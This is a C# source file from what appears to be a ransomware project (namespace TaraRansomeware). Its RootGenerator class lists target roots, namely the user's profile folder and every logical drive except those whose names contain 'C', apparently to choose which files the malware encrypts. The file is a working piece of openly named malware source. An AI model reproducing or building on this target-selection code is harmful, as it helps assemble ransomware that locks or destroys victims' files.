using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace TaraRansomeware.Utilities
{
    class RootGenerator
    {
        public static string[] generate()
        {
            List<string> lst = new List<string>();

            lst.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            string[] drives = Environment.GetLogicalDrives();
            foreach(var drive in drives)
            {
                if(drive.Contains('C'))
                {
                    continue;
                } else
                {
                    lst.Add(drive);
                }
            }

            return lst.ToArray();
        }
    }
}
